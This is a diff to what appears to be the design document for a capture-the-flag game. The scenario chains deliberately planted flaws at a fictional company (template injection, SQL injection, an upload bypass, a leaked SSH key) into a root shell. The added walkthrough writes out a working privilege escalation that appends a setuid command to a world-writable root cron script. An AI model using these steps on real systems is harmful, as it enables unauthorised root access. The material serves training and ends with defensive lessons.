@@ -19,14 +19,18 @@ quickly and cleans up later.
 
 **k.chen** - backend engineer. Careful with production systems. Uses the internal
 staff messaging system for quick operational notes, the same way most developers use
-Slack. Assumes the messaging system is private.
+Slack. Assumes the messaging system is private. Made several of the decisions that
+form the chain, none of them unreasonably.
 
 **j.harris** - full-stack developer, joined during the original build-out. Handles
 the customer portal. Their account was flagged for a credential migration eight months
 ago. The ticket is still open.
 
-**svc_admin** - the deployment service account. Owns the SSH private key used by the
-automation pipeline.
+**svc_admin** - a junior developer account that was granted SSH access to the
+deployment server so it could run automated tasks. Low privilege. Can read its own
+home directory and the application directory. Nothing else. The separation of concerns
+was deliberate. The team did their due diligence on this one — one latent mistake
+undoes all of it.
 
 ---
 
@@ -79,6 +83,21 @@ Four months ago, k.chen used the staff messaging system to send j.harris a note 
 a key transfer. The message described where the encrypted private key was stored and
 confirmed the encryption method. It was intended to be private. It sat in the
 messages table, accessible to anyone who could read that table.
+
+### Misstep 5: The Script That Should Have Been Reset
+
+During the v2.4.1 deploy on November 15th — the same one logged in `deploy.log` —
+someone was debugging why the nightly backup cron job was not firing on schedule.
+The cron runs `/opt/cerodias/maintenance.sh` as root every minute. The permissions
+were `755`. On a hunch they changed it to `777` to rule out a permissions issue.
+The cron fired. The deploy completed. The ticket was closed.
+
+Nobody changed the permissions back. There is no record of the change in git — the
+script is not version controlled. The deploy log records the deploy itself but not
+the debug step. `ls -la /opt/cerodias/maintenance.sh` shows `-rwxrwxrwx`. A world-
+writable script executed by root is a complete privilege escalation path for anyone
+who already has a low-privilege shell on the box. It does not look like a problem
+until you are the one with the shell.
 
 ### Misstep 4: The Upload Handler
 
@@ -163,10 +182,133 @@ chmod 600 id_rsa
 
 **SSH:**
 ```bash
-ssh -i id_rsa svc_admin@<server>
+ssh -i id_rsa svc_admin@<server> -p 2222
 ```
 
-Shell.
+The attacker is now on the deployment server as svc_admin. The account is restricted
+exactly as the team intended. Home directory only. Application files. Nothing
+sensitive. The separation of concerns held everywhere except one place.
+
+**Enumeration:**
+
+```bash
+cat /etc/crontab
+```
+
+A cron job runs `/opt/cerodias/maintenance.sh` every minute as root.
+
+```bash
+ls -la /opt/cerodias/maintenance.sh
+```
+
+```
+-rwxrwxrwx 1 root root 312 Nov 15 16:31 /opt/cerodias/maintenance.sh
+```
+
+November 15th. The same date as the deploy log entry. The attacker did not need to
+make that connection to exploit it, but it is there.
+
+**Escalation:**
+
+```bash
+echo 'chmod u+s /bin/bash' >> /opt/cerodias/maintenance.sh
+```
+
+Wait up to 60 seconds. Then:
+
+```bash
+/bin/bash -p
+whoami
+# root
+```
+
+**The document in root's home directory:**
+
+```bash
+cat /root/INCIDENT_DRAFT.txt
+```
+
+---
+
+## The Incident Draft
+
+The attacker reads this file from root's home directory:
+
+```
+From: k.chen@cerodias.io
+To: [draft - add Marcus before sending]
+Subject: URGENT - potential attack chain found - do not share
+
+[Written 2024-11-28, 23:47]
+
+I've been reviewing the deploy notes from this month and I need to escalate
+something before the morning standup. Writing this now because I keep going
+in circles about it and I need to get it out of my head.
+
+I think there is a complete path from the public website to a root shell on
+the deployment server. It goes through five things that individually look like
+normal technical debt. Together they are a complete chain.
+
+I'll go through them in order because the order matters.
+
+1. The search page (/search) uses render_template_string with raw user input.
+This means a visitor can inject Jinja2 expressions and read files off the server.
+I knew about CERODIAS-412 but I thought it was a performance issue. It is not
+just a performance issue. Someone who knows what to look for can read our source
+code from a browser.
+
+2. j.harris is still on MD5 (CERODIAS-431 - still open). If someone reads the
+user table through that vulnerability they get the MD5 hash. I checked tonight.
+It cracks against rockyou in about three seconds.
+
+3. Three weeks ago I sent Harris a message through the staff messaging system
+about the svc_admin key rotation. I named the passphrase file path in that message.
+At the time I thought the messaging system was isolated. It is not. The /api/v1/users
+endpoint queries the same store and it is vulnerable to SQL injection. With a UNION
+payload someone can read staff_messages. My message is still in there.
+
+4. The profile picture upload on /account/settings was ported from the PHP stack.
+The extension check uses a substring match. shell.png.php passes. The server
+executes .php files. I tested this tonight.
+
+So at this point an outside attacker can: read our source, crack Harris's password,
+read my message about the key, upload a webshell, read the passphrase, decrypt the
+SSH key blob from the user table, and SSH in as svc_admin.
+
+That is already bad. But I found something else tonight.
+
+---
+
+During the v2.4.1 deploy on Nov 15 someone changed /opt/cerodias/maintenance.sh
+to 777 to debug a cron timing issue. I remember this. I thought I changed it back.
+
+ls -la /opt/cerodias/maintenance.sh
+-rwxrwxrwx 1 root root 312 Nov 15 16:31 /opt/cerodias/maintenance.sh
+
+That script runs every minute as root. svc_admin can write to it.
+
+This is full privilege escalation from the shell we just gave someone.
+
+The complete chain is: anonymous visitor to root on the deployment server. Every
+step is something real that exists in production right now.
+
+I'm going to fix the maintenance.sh permissions now and figure out the rest in the
+morning. I have to call Marcus.
+
+Do NOT put this in Jira. Do not forward it. I don't know who has access to what.
+
+- K
+
+[DRAFT - not sent]
+```
+
+---
+
+After reading this, the attacker finds `/root/.cerodias/admin_token` — a token that
+unlocks the chain completion endpoint on the web application. Visiting
+`/admin/chain-complete` with this token shows the player's full attack timeline,
+attempt counts per step, and a leaderboard of everyone who has completed the chain
+and how long it took them. The company's own infrastructure confirms the breach.
 
 ---
 
@@ -184,7 +326,13 @@ a complete path from anonymous visitor to server shell.
 The chain works because each step gives exactly what the next step needs:
 SSTI reveals the SQLi endpoint and the passphrase file location. The SQLi yields the
 encrypted blob and the message confirming what it is. The RCE reaches the passphrase.
+The decrypted key gets you onto the box. The 777 script gets you root.
 Remove any one of these and the chain does not complete.
+
+Every safeguard held except one. svc_admin was correctly scoped as a low-privilege
+account. The permission separation was deliberate. One debug step on one deploy day
+undid it — and that step was made by the same engineer who is now up at midnight
+writing a panicked draft to the CTO.
 
 ---
 
@@ -204,3 +352,10 @@ Remove any one of these and the chain does not complete.
 - **Key management:** The encrypted blob and its passphrase should not both be
   reachable by the same attacker through the same application. The encryption gave
   a false sense of safety.
+- **Cron scripts:** Any script executed by a privileged cron job must be owned by
+  root and not writable by anyone else. Debug permission changes must be reverted
+  before the session ends, not before the next audit.
+- **Privilege separation:** svc_admin's access scope was correctly designed. The
+  failure was a single file permission, not a design failure. This is harder to
+  prevent than a design flaw — it requires operational discipline at the moment of
+  the change, not just at design time.
